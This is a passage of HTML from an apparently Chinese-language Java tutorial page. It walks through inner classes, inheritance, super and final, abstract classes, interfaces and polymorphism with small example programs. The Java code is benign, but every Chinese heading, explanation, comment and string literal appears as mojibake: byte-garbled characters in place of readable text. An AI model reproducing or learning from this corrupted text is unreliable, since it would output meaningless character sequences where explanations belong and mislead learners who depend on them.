class="hljs-string">&quot;æˆ‘æ˜¯é™æ€å†…éƒ¨ç±»&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// æ–¹æ³•å†…éƒ¨ç±»ï¼ˆå±€éƒ¨å†…éƒ¨ç±»ï¼‰</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testLocalClass</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalClass</span> &#123;<br>            <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;æˆ‘æ˜¯å±€éƒ¨å†…éƒ¨ç±»&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">LocalClass</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LocalClass</span>();<br>        local.show();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Outer</span> <span class="hljs-variable">outer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer</span>();<br>        <br>        <span class="hljs-comment">// åˆ›å»ºæˆå‘˜å†…éƒ¨ç±»å¯¹è±¡</span><br>        Outer.<span class="hljs-type">Inner</span> <span class="hljs-variable">inner</span> <span class="hljs-operator">=</span> outer.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner</span>();<br>        inner.show();<br>        <br>        <span class="hljs-comment">// åˆ›å»ºé™æ€å†…éƒ¨ç±»å¯¹è±¡</span><br>        Outer.<span class="hljs-type">StaticInner</span> <span class="hljs-variable">staticInner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer</span>.StaticInner();<br>        staticInner.show();<br>        <br>        <span class="hljs-comment">// è°ƒç”¨åŒ…å«å±€éƒ¨å†…éƒ¨ç±»çš„æ–¹æ³•</span><br>        outer.testLocalClass();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Javaé¢å‘å¯¹è±¡é«˜çº§ç‰¹æ€§-ä»é›¶å­¦ä¹ ç¬”è®°"><a href="#Javaé¢å‘å¯¹è±¡é«˜çº§ç‰¹æ€§-ä»é›¶å­¦ä¹ ç¬”è®°" class="headerlink" title="Javaé¢å‘å¯¹è±¡é«˜çº§ç‰¹æ€§ - ä»é›¶å­¦ä¹ ç¬”è®°"></a>Javaé¢å‘å¯¹è±¡é«˜çº§ç‰¹æ€§ - ä»é›¶å­¦ä¹ ç¬”è®°</h1><h2 id="ğŸ§¬-2-1-ç»§æ‰¿"><a href="#ğŸ§¬-2-1-ç»§æ‰¿" class="headerlink" title="ğŸ§¬ 2.1 ç»§æ‰¿"></a>ğŸ§¬ 2.1 ç»§æ‰¿</h2><h3 id="é€šä¿—ç†è§£-8"><a href="#é€šä¿—ç†è§£-8" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><p>å„¿å­ç»§æ‰¿çˆ¶äº²çš„è´¢äº§å’ŒæŠ€èƒ½ï¼Œè¿˜å¯ä»¥å‘å±•è‡ªå·±çš„ç‰¹é•¿</p><h3 id="ä»£ç æ¼”ç¤º-8"><a href="#ä»£ç æ¼”ç¤º-8" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// çˆ¶ç±»ï¼ˆåŸºç±»ï¼‰</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>    String name;<br>    <span class="hljs-type">int</span> age;<br>    <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(name + <span class="hljs-string">&quot;åœ¨åƒä¸œè¥¿&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">sleep</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(name + <span class="hljs-string">&quot;åœ¨ç¡è§‰&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// å­ç±»ï¼ˆæ´¾ç”Ÿç±»ï¼‰</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> &#123;  <span class="hljs-comment">// extendsè¡¨ç¤ºç»§æ‰¿</span><br>    String breed;  <span class="hljs-comment">// å­ç±»ç‰¹æœ‰çš„å±æ€§</span><br>    <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">bark</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(name + <span class="hljs-string">&quot;åœ¨æ±ªæ±ªå«&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// å­ç±»å¯ä»¥é‡å†™çˆ¶ç±»æ–¹æ³•</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(name + <span class="hljs-string">&quot;åœ¨åƒç‹—ç²®&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">meow</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(name + <span class="hljs-string">&quot;åœ¨å–µå–µå«&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(name + <span class="hljs-string">&quot;åœ¨åƒçŒ«ç²®&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Dog</span> <span class="hljs-variable">dog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();<br>        dog.name = <span class="hljs-string">&quot;æ—ºè´¢&quot;</span>;  <span class="hljs-comment">// ç»§æ‰¿è‡ªAnimal</span><br>        dog.age = <span class="hljs-number">2</span>;        <span class="hljs-comment">// ç»§æ‰¿è‡ªAnimal</span><br>        dog.breed = <span class="hljs-string">&quot;é‡‘æ¯›&quot;</span>;  <span class="hljs-comment">// è‡ªå·±çš„å±æ€§</span><br>        dog.eat();          <span class="hljs-comment">// è°ƒç”¨é‡å†™åçš„æ–¹æ³•</span><br>        dog.bark();         <span class="hljs-comment">// è°ƒç”¨è‡ªå·±çš„æ–¹æ³•</span><br>        <br>        <span class="hljs-type">Cat</span> <span class="hljs-variable">cat</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br>        cat.name = <span class="hljs-string">&quot;å’ªå’ª&quot;</span>;<br>        cat.eat();          <span class="hljs-comment">// è¾“å‡ºï¼šå’ªå’ªåœ¨åƒçŒ«ç²®</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ğŸ”‘-2-2-superå’Œfinalå…³é”®å­—"><a href="#ğŸ”‘-2-2-superå’Œfinalå…³é”®å­—" class="headerlink" title="ğŸ”‘ 2.2 superå’Œfinalå…³é”®å­—"></a>ğŸ”‘ 2.2 superå’Œfinalå…³é”®å­—</h2><h3 id="é€šä¿—ç†è§£-9"><a href="#é€šä¿—ç†è§£-9" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><ul><li><strong>super</strong>ï¼šæ‰¾çˆ¸çˆ¸å¸®å¿™æˆ–æ‹¿çˆ¸çˆ¸çš„ä¸œè¥¿</li><li><strong>final</strong>ï¼šä¸€æ—¦ç¡®å®šå°±ä¸èƒ½æ”¹å˜ï¼Œåƒèº«ä»½è¯å·</li></ul><h3 id="ä»£ç æ¼”ç¤º-9"><a href="#ä»£ç æ¼”ç¤º-9" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">COUNTRY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ä¸­å›½&quot;</span>;  <span class="hljs-comment">// finalå¸¸é‡ï¼Œä¸èƒ½ä¿®æ”¹</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;äººç±»&quot;</span>;<br>    <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">introduce</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æˆ‘æ˜¯&quot;</span> + name);<br>    &#125;<br>    <br>    <span class="hljs-comment">// finalæ–¹æ³•ï¼Œå­ç±»ä¸èƒ½é‡å†™</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">breathe</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;å‘¼å¸ç©ºæ°”&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// finalç±»ï¼Œä¸èƒ½è¢«ç»§æ‰¿</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;è€å¸ˆ&quot;</span>;<br>    <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;å›½ç±ï¼š&quot;</span> + <span class="hljs-built_in">super</span>.COUNTRY);  <span class="hljs-comment">// è®¿é—®çˆ¶ç±»å¸¸é‡</span><br>        System.out.println(<span class="hljs-string">&quot;çˆ¶ç±»çš„åå­—ï¼š&quot;</span> + <span class="hljs-built_in">super</span>.name);  <span class="hljs-comment">// è®¿é—®çˆ¶ç±»å±æ€§</span><br>        <span class="hljs-built_in">super</span>.introduce();  <span class="hljs-comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span><br>        System.out.println(<span class="hljs-string">&quot;å­ç±»çš„åå­—ï¼š&quot;</span> + <span class="hljs-built_in">this</span>.name);<br>    &#125;<br>    <br>    <span class="hljs-comment">// ä¸èƒ½é‡å†™breathe()æ–¹æ³•ï¼Œå› ä¸ºçˆ¶ç±»ç”¨finalä¿®é¥°</span><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Teacher</span> <span class="hljs-variable">teacher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>();<br>        teacher.show();<br>        teacher.breathe();  <span class="hljs-comment">// è°ƒç”¨finalæ–¹æ³•</span><br>        <br>        <span class="hljs-comment">// teacher.COUNTRY = &quot;ç¾å›½&quot;;  // âŒ é”™è¯¯ï¼šfinalå¸¸é‡ä¸èƒ½ä¿®æ”¹</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ğŸ“‹-2-3-æŠ½è±¡ç±»"><a href="#ğŸ“‹-2-3-æŠ½è±¡ç±»" class="headerlink" title="ğŸ“‹ 2.3 æŠ½è±¡ç±»"></a>ğŸ“‹ 2.3 æŠ½è±¡ç±»</h2><h3 id="é€šä¿—ç†è§£-10"><a href="#é€šä¿—ç†è§£-10" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><p>åƒå…¬å¸çš„å²—ä½æè¿°ï¼Œè§„å®šäº†è¦åšä»€ä¹ˆï¼Œä½†å…·ä½“æ€ä¹ˆåšç”±å‘˜å·¥è‡ªå·±å†³å®š</p><h3 id="ä»£ç æ¼”ç¤º-10"><a href="#ä»£ç æ¼”ç¤º-10" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æŠ½è±¡ç±»</span><br><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shape</span> &#123;<br>    String color;<br>    <br>    <span class="hljs-comment">// æŠ½è±¡æ–¹æ³•ï¼šåªæœ‰å£°æ˜ï¼Œæ²¡æœ‰å®ç°</span><br>    <span class="hljs-keyword">abstract</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculateArea</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculatePerimeter</span><span class="hljs-params">()</span>;<br>    <br>    <span class="hljs-comment">// æ™®é€šæ–¹æ³•</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setColor</span><span class="hljs-params">(String color)</span> &#123;<br>        <span class="hljs-built_in">this</span>.color = color;<br>    &#125;<br>    <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">showColor</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;é¢œè‰²ï¼š&quot;</span> + color);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// å…·ä½“ç±»å®ç°æŠ½è±¡ç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>    <span class="hljs-type">double</span> radius;<br>    <br>    Circle(<span class="hljs-type">double</span> radius) &#123;<br>        <span class="hljs-built_in">this</span>.radius = radius;<br>    &#125;<br>    <br>    <span class="hljs-comment">// å¿…é¡»å®ç°æŠ½è±¡æ–¹æ³•</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-type">double</span> <span class="hljs-title function_">calculateArea</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">3.14</span> * radius * radius;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-type">double</span> <span class="hljs-title function_">calculatePerimeter</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * <span class="hljs-number">3.14</span> * radius;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rectangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>    <span class="hljs-type">double</span> width;<br>    <span class="hljs-type">double</span> height;<br>    <br>    Rectangle(<span class="hljs-type">double</span> width, <span class="hljs-type">double</span> height) &#123;<br>        <span class="hljs-built_in">this</span>.width = width;<br>        <span class="hljs-built_in">this</span>.height = height;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-type">double</span> <span class="hljs-title function_">calculateArea</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> width * height;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-type">double</span> <span class="hljs-title function_">calculatePerimeter</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * (width + height);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// Shape shape = new Shape();  // âŒ é”™è¯¯ï¼šæŠ½è±¡ç±»ä¸èƒ½å®ä¾‹åŒ–</span><br>        <br>        <span class="hljs-type">Circle</span> <span class="hljs-variable">circle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Circle</span>(<span class="hljs-number">5.0</span>);<br>        circle.setColor(<span class="hljs-string">&quot;çº¢è‰²&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;åœ†é¢ç§¯ï¼š&quot;</span> + circle.calculateArea());<br>        <br>        <span class="hljs-type">Rectangle</span> <span class="hljs-variable">rect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>(<span class="hljs-number">4.0</span>, <span class="hljs-number">3.0</span>);<br>        rect.setColor(<span class="hljs-string">&quot;è“è‰²&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;çŸ©å½¢å‘¨é•¿ï¼š&quot;</span> + rect.calculatePerimeter());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ğŸ”Œ-2-4-æ¥å£"><a href="#ğŸ”Œ-2-4-æ¥å£" class="headerlink" title="ğŸ”Œ 2.4 æ¥å£"></a>ğŸ”Œ 2.4 æ¥å£</h2><h3 id="é€šä¿—ç†è§£-11"><a href="#é€šä¿—ç†è§£-11" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><p>åƒç”µå™¨æ’åº§æ ‡å‡†ï¼Œè§„å®šäº†æ’å­”å½¢çŠ¶ï¼Œå…·ä½“ç”µå™¨æ€ä¹ˆå®ç°ä¸ç®¡</p><h3 id="ä»£ç æ¼”ç¤º-11"><a href="#ä»£ç æ¼”ç¤º-11" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æ¥å£</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">USB</span> &#123;<br>    <span class="hljs-comment">// æ¥å£ä¸­çš„å¸¸é‡ï¼ˆé»˜è®¤public static finalï¼‰</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">VERSION</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;3.0&quot;</span>;<br>    <br>    <span class="hljs-comment">// æŠ½è±¡æ–¹æ³•ï¼ˆé»˜è®¤public abstractï¼‰</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">transferData</span><span class="hljs-params">()</span>;<br>    <br>    <span class="hljs-comment">// JDK8ä»¥åå¯ä»¥æœ‰é»˜è®¤æ–¹æ³•</span><br>    <span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showVersion</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;USBç‰ˆæœ¬ï¼š&quot;</span> + VERSION);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Charging</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">charge</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-comment">// ç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mouse</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">USB</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;é¼ æ ‡å·²è¿æ¥&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transferData</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¼ è¾“é¼ æ ‡ç§»åŠ¨æ•°æ®&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SmartPhone</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">USB</span>, Charging &#123;  <span class="hljs-comment">// å¤šæ¥å£å®ç°</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰‹æœºå·²è¿æ¥&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transferData</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¼ è¾“æ‰‹æœºæ•°æ®&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰‹æœºæ­£åœ¨å……ç”µ&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Mouse</span> <span class="hljs-variable">mouse</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mouse</span>();<br>        mouse.connect();<br>        mouse.showVersion();  <span class="hljs-comment">// è°ƒç”¨æ¥å£çš„é»˜è®¤æ–¹æ³•</span><br>        <br>        <span class="hljs-type">SmartPhone</span> <span class="hljs-variable">phone</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartPhone</span>();<br>        phone.connect();<br>        phone.transferData();<br>        phone.charge();<br>        <br>        <span class="hljs-comment">// æ¥å£å¤šæ€</span><br>        <span class="hljs-type">USB</span> <span class="hljs-variable">usbDevice</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mouse</span>();<br>        usbDevice.connect();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ğŸ­-2-5-å¯¹è±¡å¤šæ€æ€§"><a href="#ğŸ­-2-5-å¯¹è±¡å¤šæ€æ€§" class="headerlink" title="ğŸ­ 2.5 å¯¹è±¡å¤šæ€æ€§"></a>ğŸ­ 2.5 å¯¹è±¡å¤šæ€æ€§</h2><h3 id="é€šä¿—ç†è§£-12"><a href="#é€šä¿—ç†è§£-12" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><p>åŒä¸€ä¸ªäººåœ¨ä¸åŒåœºåˆæ‰®æ¼”ä¸åŒè§’è‰²ï¼ˆçˆ¶äº²ã€å„¿å­ã€å‘˜å·¥ï¼‰</p><h3 id="ä»£ç æ¼”ç¤º-12"><a href="#ä»£ç æ¼”ç¤º-12" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 